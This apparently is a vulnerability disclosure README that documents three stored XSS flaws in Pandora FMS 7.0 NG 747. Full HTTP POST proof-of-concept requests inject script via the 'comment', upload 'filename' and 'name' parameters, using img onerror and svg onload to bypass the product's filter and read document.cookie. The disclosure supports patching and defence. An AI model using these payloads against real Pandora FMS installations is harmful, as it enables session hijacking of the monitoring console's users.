# Pandora-FMS-7.0-NG-747-Stored-XSS-Vulnerabilities
Three stored cross-site scripting (XSS) in [Pandora FMS 7.0 NG 747](https://pandorafms.org/features/free-download-monitoring-software/) can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page. In addition, the existing XSS filter can be bypassed with the "<img" tag.

Pandora FMS 7.0 NG747 and older versions are affected by these vulnerabilities.


# PoC-1 (comment)
To exploit vulnerability, someone could use a POST request to '/pandora_console/ajax.php' by manipulating 'comment' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /pandora_console/ajax.php HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 119
DNT: 1
Connection: close
Cookie: PHPSESSID=a55pr5b4gff5ea1h0pms4csrk5

page=include/ajax/events&add_comment=1&event_id=7&comment=<img src=x onerror="alert(document.cookie)">&meta=0&history=0
```

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-01.png)

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-02.png)

# PoC-2 (filename)
To exploit vulnerability, someone could use a POST request to '/pandora_console/index.php?sec=workspace&sec2=operation/incidents/incident_detail&id=3&upload_file=1' by manipulating 'filename' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /pandora_console/index.php?sec=workspace&sec2=operation/incidents/incident_detail&id=3&upload_file=1 HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------188134206132629608391758747427
Content-Length: 524
DNT: 1
Connection: close
Cookie: PHPSESSID=3098fl65su4l237navvq6d5igs
Upgrade-Insecure-Requests: 1

-----------------------------188134206132629608391758747427
Content-Disposition: form-data; name="userfile"; filename="\"><svg onload=alert(document.cookie)>.png"
Content-Type: image/png

"><svg onload=alert(1)>
-----------------------------188134206132629608391758747427
Content-Disposition: form-data; name="file_description"

desc
-----------------------------188134206132629608391758747427
Content-Disposition: form-data; name="upload"

Upload
-----------------------------188134206132629608391758747427--

```

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-v2-01.png)

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-v2-02.png)

# PoC-3 (name)
To exploit vulnerability, someone could use a POST request to '/pandora_console/index.php' by manipulating 'name' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /pandora_console/index.php?sec=templates&sec2=godmode/modules/manage_network_components&refr=&search_id_group=0search_string=alert&search_string=alert&search=Search HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1395
DNT: 1
Connection: close
Cookie: PHPSESSID=3098fl65su4l237navvq6d5igs
Upgrade-Insecure-Requests: 1

name=%3Cimg+src%3Dx+onerror%3D%22alert%28document.cookie%29%22%3E&type=6&type_names=eyI3IjoicmVtb3RlX2ljbXAiLCI2IjoicmVtb3RlX2ljbXBfcHJvYyIsIjE3IjoicmVtb3RlX3NubXBfc3RyaW5nIiwiMTgiOiJyZW1vdGVfc25tcF9wcm9jIiwiMTYiOiJyZW1vdGVfc25tcF9pbmMiLCIxNSI6InJlbW90ZV9zbm1wIiwiMTAiOiJyZW1vdGVfdGNwX3N0cmluZyIsIjkiOiJyZW1vdGVfdGNwX3Byb2MiLCIxMSI6InJlbW90ZV90Y3BfaW5jIiwiOCI6InJlbW90ZV90Y3AifQ%3D%3D&id_module_group=10&id_group=1&module_interval5f157220324ea_select=300&module_interval5f157220324ea_text=5&module_interval=300&module_interval5f157220324ea_units=60&dynamic_interval_select=0&dynamic_interval_text=&dynamic_interval=None&dynamic_interval_units=1&dynamic_min=0&dynamic_max=0&dynamic_two_tailed_sent=1&min_warning=0&max_warning=0&str_warning=&warning_inverse_sent=1&min_critical=0&max_critical=0&str_critical=&critical_inverse_sent=1&ff_type_sent=1&each_ff=0&ff_event=0&ff_event_normal=0&ff_event_warning=0&ff_event_critical=0&history_data=1&history_data_sent=1&min=0&max=0&unit=&throw_unknown_events=1&throw_unknown_events_sent=1&critical_instructions=&warning_instructions=&unknown_instructions=&description=&id_category=0&id_tag_available%5B%5D=critical&id_tag_selected%5B%5D=&snmp_community=&active_snmp_v3=0&post_process5f15722032b45_select=0&post_process5f15722032b45_text=0&post_process=0&name_oid=&command_text=&id_component_type=2&create_component=1&create_network_from_module=0&crt=Create
```

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-v3-01.png)

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-v3-02.png)
